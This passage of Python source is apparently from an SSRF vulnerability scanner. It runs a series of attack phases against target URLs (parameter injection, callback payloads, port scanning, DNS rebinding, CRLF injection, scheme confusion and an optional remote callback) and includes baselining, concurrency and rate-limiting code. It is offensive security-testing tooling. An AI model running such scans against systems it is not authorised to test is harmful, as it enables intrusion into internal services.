            except Exception as e:
                self.logger.error(f"Error in Encoded attack: {str(e)}")
            
            try:
                self.progress.current_phase = "Parameter"
                # Existing behavior: append extra parameters from payloads/parameter_payloads.txt
                await self.parameterAttack(url, original_response)
                # New behavior: replace existing parameter values with callback-style payloads
                await self.parameterCallbackAttack(url, original_response)
            except Exception as e:
                self.logger.error(f"Error in Parameter attack: {str(e)}")
            
            try:
                self.progress.current_phase = "Port Scan"
                await self.portScanAttack(url, original_response)
            except Exception as e:
                self.logger.error(f"Error in Port Scan attack: {str(e)}")
            
            try:
                self.progress.current_phase = "DNS Rebinding"
                await self.dnsRebindingAttack(url, original_response)
            except Exception as e:
                self.logger.error(f"Error in DNS Rebinding attack: {str(e)}")
            
            try:
                self.progress.current_phase = "CRLF Injection"
                await self.crlfInjectionAttack(url, original_response)
            except Exception as e:
                self.logger.error(f"Error in CRLF Injection attack: {str(e)}")
            
            try:
                self.progress.current_phase = "Scheme Confusion"
                await self.schemeConfusionAttack(url, original_response)
            except Exception as e:
                self.logger.error(f"Error in Scheme Confusion attack: {str(e)}")
            
            # Only run remote attack if backurl is provided
            if self.backurl:
                try:
                    self.progress.current_phase = "Remote"
                    await self.remoteAttack(url, original_response)
                except Exception as e:
                    self.logger.error(f"Error in Remote attack: {str(e)}")
        else:
            async with self.lock:
                self.nrErrorUrl += 1
            if not self.quiet_mode:
                print(Fore.RED + f"\n[!] Failed to get response from {url}")
                print(Fore.YELLOW + f"[*] Check network connectivity or try with -d for debug info")

    async def baseline_target(self, url):
        """Create baseline fingerprint of target to reduce false positives"""
        baselines = []
        max_attempts = 3
        
        for attempt in range(max_attempts):
            try:
                response = await self.make_request(url)
                if response:
                    baselines.append({
                        'status': response.status_code,
                        'length': len(response.content),
                        'content_hash': hash(response.content)
                    })
                await asyncio.sleep(0.2)  # Small delay between baselines
            except Exception as e:
                if self.config.scanner['debug']:
                    self.logger.error(f"Baseline attempt {attempt + 1} failed: {str(e)}")
                await asyncio.sleep(0.5)  # Wait longer on error
                continue
        
        if not baselines:
            if not self.quiet_mode:
                print(f"\n[!] Warning: Could not establish baseline for {url}")
                print(f"[*] Continuing scan without baseline (may have more false positives)")
            return None
            
        # Calculate baseline statistics
        return {
            'status_codes': set(b['status'] for b in baselines),
            'avg_length': sum(b['length'] for b in baselines) / len(baselines),
            'length_variance': max(b['length'] for b in baselines) - min(b['length'] for b in baselines),
            'stable': len(set(b['content_hash'] for b in baselines)) == 1  # All responses identical
        }
    
    async def scan_url(self, url):
        """Process a single URL"""
        async with self.lock:
            self.nrUrlsAnalyzed += 1
        self.print_progress()
        
        # Create baseline first
        if not self.quiet_mode:
            print(f"\n[*] Creating baseline for {url}...")
        
        baseline = await self.baseline_target(url)
        
        if baseline:
            if not self.quiet_mode:
                print(f"[*] Baseline: Status={baseline['status_codes']}, "
                      f"AvgSize={baseline['avg_length']:.0f}, "
                      f"Stable={'Yes' if baseline['stable'] else 'No'}")
        else:
            # Create a minimal baseline to allow scanning to continue
            if not self.quiet_mode:
                print(f"[*] Using permissive detection mode (no baseline)")
        
        await self.performAllAttack(url, baseline)

    def print_final_summary(self):
        """Print scanner-specific statistics (response codes, failures, etc.)"""
        if not self.quiet_mode:
            # Only print scanner-specific stats, not duplicating reporter output
            if self.response_codes:
                print(f"\n📋 Response Code Breakdown:")
                for code, count in sorted(self.response_codes.items(), key=lambda x: x[1], reverse=True)[:10]:
                    print(f"  {code}: {count:,} responses")
            
            if self.failure_reasons:
                print(f"\n❌ Failure Breakdown:")
                for reason, count in sorted(self.failure_reasons.items(), key=lambda x: x[1], reverse=True)[:5]:
                    print(f"  {reason}: {count:,}")

    async def run(self, urls=None, url_file=None):
        """Run the SSRF scanner"""
        url_list = []
        
        if urls:
            url_list = urls
            self.nrTotUrls = len(urls)
        elif url_file:
            with open(url_file) as f:
                url_list = [line.strip() for line in f if line.strip()]
                self.nrTotUrls = len(url_list)

        # Initialize reporter with output format
        self.reporter = Reporter(
            self.config.scanner['output_dir'],
            self.config.output['format']
        )

        # Initialize locks
        self.lock = asyncio.Lock()
        self.file_lock = threading.Lock()
        
        # Create semaphore for concurrency control
        self.semaphore = asyncio.Semaphore(self.config.scanner['concurrency'])

        # Build the throttler now that CLI overrides (e.g. --rate-limit) have
        # been applied. The active request path uses this throttler to enforce
        # the configured requests-per-second and adapt on errors.
        rps = self.config.rate_limiting['requests_per_second']
        burst = self.config.rate_limiting.get('burst_size', 100)
        self.throttler = SmartThrottler(requests_per_second=rps, burst_size=burst)
        
        # Create session
        await self.request_manager.create_session()
        
        # Print configuration
        if not self.quiet_mode:
            print(f"\n[*] Configuration:")
            print(f"    Concurrency: {self.config.scanner['concurrency']}")
            print(f"    Rate Limit: {self.config.rate_limiting['requests_per_second']} req/s")
            print(f"    Timeout: {self.config.scanner['timeout']}s")
            print(f"    Output Format: {self.config.output['format']}")
            if self.config.scanner.get('proxy'):
                print(f"    Proxy: {self.config.scanner['proxy']}")
            print()
        
        # Start timing
        self.scan_start_time = time.time()
        
        try:
            # Process all URLs concurrently
            tasks = [self.scan_url(url) for url in url_list]
            await asyncio.gather(*tasks, return_exceptions=True)
        finally:
            # Close session
            await self.request_manager.close_session()
            
            # Calculate total scan time
            if self.scan_start_time:
                scan_duration = time.time() - self.scan_start_time
                if not self.quiet_mode:
                    print(f"\n\n⏱️  Total Scan Time: {scan_duration:.2f} seconds")
        
        # Pass scanner stats to reporter for accurate final summary
        self.reporter._scanner_stats = {
            'total_attempted': self.total_requests_attempted,
            'total_succeeded': self.total_requests_succeeded,
            'total_failed': self.total_requests_failed,
            'success_rate': (self.total_requests_succeeded / self.total_requests_attempted * 100) if self.total_requests_attempted > 0 else 0,
            'response_codes': self.response_codes,
            'failure_reasons': self.failure_reasons
        }
        
        # Print scanner-specific stats first
        self.print_final_summary()
        
        # Generate and print reporter summary
        summary = self.reporter.generate_summary()
        print(summary)



